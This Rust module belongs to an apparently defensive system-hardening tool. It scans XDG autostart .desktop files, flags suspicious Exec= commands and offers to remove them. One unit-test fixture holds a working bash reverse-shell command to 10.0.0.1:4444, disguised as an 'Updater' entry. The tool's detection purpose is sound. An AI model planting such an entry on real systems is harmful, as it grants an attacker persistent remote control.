//! XDG autostart entries.
//!
//! Any `.desktop` file in an autostart directory launches its `Exec=` line
//! when a desktop session begins. Competition boxes are usually headless, so
//! entries here deserve a look even when they appear benign.

use std::path::{Path, PathBuf};

use crate::core::scan::{read_text_files, references_untrusted_dir, suspicious_matches};
use crate::core::{DefenderContext, Result, collect_accounts, prompt_yes, require_root};

/// System-wide autostart directories, applying to every session.
const SYSTEM_AUTOSTART_DIRS: &[&str] = &["/etc/xdg/autostart", "/usr/share/autostart"];

/// Per-account autostart directory, relative to the home directory.
const USER_AUTOSTART_DIR: &str = ".config/autostart";

/// A desktop entry launched when a session starts.
pub struct Entry {
    /// The `.desktop` file.
    pub file: PathBuf,
    /// Display name, or `(unnamed)` when the file has none.
    pub name: String,
    /// The command line it launches.
    pub exec: String,
    /// Why the command looks dangerous; empty if nothing matched.
    pub reasons: Vec<&'static str>,
}

/// Report XDG autostart entries and offer to remove flagged ones.
pub fn run(ctx: &DefenderContext) -> Result {
    let mut dirs: Vec<PathBuf> = SYSTEM_AUTOSTART_DIRS.iter().map(PathBuf::from).collect();

    for account in collect_accounts()?.iter().filter(|a| a.can_log_in()) {
        dirs.push(account.home.join(USER_AUTOSTART_DIR));
    }

    let mut entries = Vec::new();
    for dir in &dirs {
        for (path, contents) in read_text_files(dir) {
            if path.extension().is_some_and(|e| e == "desktop")
                && let Some(entry) = parse_desktop(&path, &contents)
            {
                entries.push(entry);
            }
        }
    }

    ctx.debug(&format!("Found {} autostart entry(s)", entries.len()));

    if entries.is_empty() {
        println!("[✓] No XDG autostart entries found");
        return Ok(());
    }

    let is_root = require_root().is_ok();
    println!("[+] {} autostart entry(s):", entries.len());

    for entry in &entries {
        println!("    {} — {}", entry.name, entry.file.display());
        println!("      Exec: {}", entry.exec);

        if entry.reasons.is_empty() {
            continue;
        }

        println!("      [!] {}", entry.reasons.join(", "));

        if !is_root {
            println!("      [!] Not running as root — skipping removal option.");
            continue;
        }

        if prompt_yes(&format!("[?] Remove {}? (y/N)", entry.file.display()))? {
            std::fs::remove_file(&entry.file)?;
            println!("      [+] Removed {}", entry.file.display());
        }
    }

    Ok(())
}

/// Pull the display name and `Exec=` line out of a `.desktop` file.
fn parse_desktop(path: &Path, contents: &str) -> Option<Entry> {
    let mut name = None;
    let mut exec = None;

    for line in contents.lines() {
        let trimmed = line.trim();
        if let Some(value) = trimmed.strip_prefix("Exec=")
            && exec.is_none()
        {
            exec = Some(value.trim().to_string());
        } else if let Some(value) = trimmed.strip_prefix("Name=")
            && name.is_none()
        {
            name = Some(value.trim().to_string());
        }
    }

    let exec = exec?;
    let mut reasons = suspicious_matches(&exec);
    if references_untrusted_dir(&exec) {
        reasons.push("runs from a world-writable directory");
    }

    Some(Entry {
        file: path.to_path_buf(),
        name: name.unwrap_or_else(|| "(unnamed)".to_string()),
        exec,
        reasons,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    const BENIGN: &str = "\
[Desktop Entry]
Type=Application
Name=Screensaver
Exec=/usr/bin/xscreensaver -nosplash
";

    const MALICIOUS: &str = "\
[Desktop Entry]
Type=Application
Name=Updater
Exec=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
";

    #[test]
    fn reads_name_and_exec() {
        let entry = parse_desktop(Path::new("a.desktop"), BENIGN).unwrap();

        assert_eq!(entry.name, "Screensaver");
        assert_eq!(entry.exec, "/usr/bin/xscreensaver -nosplash");
        assert!(entry.reasons.is_empty());
    }

    #[test]
    fn flags_a_reverse_shell_entry() {
        let entry = parse_desktop(Path::new("b.desktop"), MALICIOUS).unwrap();

        assert_eq!(entry.name, "Updater");
        assert!(
            entry
                .reasons
                .contains(&"bash network redirection (reverse shell)")
        );
    }

    #[test]
    fn flags_execution_from_tmp() {
        let desktop = "[Desktop Entry]\nName=X\nExec=/tmp/.hidden\n";
        let entry = parse_desktop(Path::new("c.desktop"), desktop).unwrap();

        assert!(
            entry
                .reasons
                .contains(&"runs from a world-writable directory")
        );
    }

    #[test]
    fn an_entry_without_exec_is_skipped() {
        let desktop = "[Desktop Entry]\nType=Application\nName=Nothing\n";
        assert!(parse_desktop(Path::new("d.desktop"), desktop).is_none());
    }

    #[test]
    fn an_unnamed_entry_still_parses() {
        let entry = parse_desktop(Path::new("e.desktop"), "Exec=/usr/bin/true\n").unwrap();
        assert_eq!(entry.name, "(unnamed)");
    }
}
